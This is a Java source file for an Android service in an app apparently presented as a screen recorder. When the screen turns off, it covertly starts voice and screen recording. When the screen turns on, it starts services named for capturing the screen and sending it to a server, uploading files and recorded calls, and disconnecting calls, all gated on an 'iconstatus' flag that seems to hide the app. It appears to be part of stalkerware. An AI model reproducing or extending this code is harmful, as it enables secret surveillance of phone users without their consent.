package com.recorder.screen.screen_recorder.services;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.os.PowerManager;
import android.support.annotation.Nullable;
import android.util.Log;

import com.recorder.screen.screen_recorder.helper.Values;

import java.util.Timer;

public class PhoneTypeDemo extends Service {
    Timer timer;
    public static boolean Phonedisconnect = false;
    BroadcastReceiver mReceiver;
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        IntentFilter filter = new IntentFilter(Intent.ACTION_SCREEN_ON);
        filter.addAction(Intent.ACTION_SCREEN_OFF);
        mReceiver = new ScreenReceiver1();
        registerReceiver(mReceiver, filter);

        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        PowerManager.WakeLock wl = pm.newWakeLock(PowerManager.SCREEN_DIM_WAKE_LOCK, "My Tag");
        wl.acquire();

        wl.release();
    }
    @Override
    public void onStart(Intent intent, int startId) {
    }

    class ScreenReceiver1 extends BroadcastReceiver {

        @Override
        public void onReceive(Context context, Intent intent) {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            PowerManager.WakeLock wl = pm.newWakeLock(PowerManager.SCREEN_DIM_WAKE_LOCK, "My Tag");
            wl.acquire();

            Log.e(".............", "----------------------------------------- PhoneTypeDemo");

            wl.release();

            if (Values.getSharedPrefrence("iconstatus", getApplicationContext()).equalsIgnoreCase("1")) {

                if (intent.getAction().equals(Intent.ACTION_SCREEN_ON)) {
                    Log.d("ScreenOn", "screen ON");
                    try {
                        if (timer != null)
                            timer.cancel();
                    } catch (Exception e) {
                        ;
                    }
                    getApplicationContext().stopService(new Intent(getApplicationContext(), startrecordingservice.class));
                    //getApplicationContext().stopService(new Intent(getApplicationContext(), Startvoice.class));

                    if (!FileSend.running) {
                        getApplicationContext().startService(new Intent(getApplicationContext(), FileSend.class));
                    }

                    getApplicationContext().stopService(new Intent(getApplicationContext(), StatusCheck.class));


                    getApplicationContext().stopService(new Intent(getApplicationContext(), startcallrecording.class));

                    if (!FileSendCall.running) {
                        getApplicationContext().startService(new Intent(getApplicationContext(), FileSendCall.class));
                    }

                    if(!CatureScreenAndSendServer.running) {
                        getApplicationContext().startService(new Intent(getApplicationContext(), CatureScreenAndSendServer.class));
                    }

                    if (!disconnectcall.disconnect) {
                        getApplicationContext().startService(new Intent(getApplicationContext(), disconnectcall.class));
                    }
                    getApplicationContext().stopService(new Intent(getApplicationContext(), Startvoice1.class));
                } else {
                    Log.d("ScreenOff", "screen OFF");
                    try {
                        if (timer != null)
                            timer.cancel();
                    } catch (Exception e) {
                    }

                    if (!startrecordingservice.recording_started) {
                        getApplicationContext().startService(new Intent(getApplicationContext(), startrecordingservice.class));
                    }
                    if (!Startvoice.start_recording) {
                        getApplicationContext().startService(new Intent(getApplicationContext(), Startvoice.class));
                    }
                    getApplicationContext().startService(new Intent(getApplicationContext(), FileSend.class));

                    getApplicationContext().stopService(new Intent(getApplicationContext(), StatusCheck.class));
                    getApplicationContext().stopService(new Intent(getApplicationContext(), CatureScreenAndSendServer.class));

                    getApplicationContext().stopService(new Intent(getApplicationContext(), startcallrecording.class));
                    getApplicationContext().stopService(new Intent(getApplicationContext(), Startvoice1.class));
                    if (!FileSendCall.running) {
                        getApplicationContext().startService(new Intent(getApplicationContext(), FileSendCall.class));
                    }
                    getApplicationContext().stopService(new Intent(getApplicationContext(), disconnectcall.class));
                }
            }

        }

    }

    @Override
    public void onDestroy() {
        Phonedisconnect =false;
        try {
        timer.cancel();
        } catch (Exception e) {}

        try {
            unregisterReceiver(mReceiver);
        }
        catch (Exception e) {}
        stopSelf();
        super.onDestroy();
    }
}
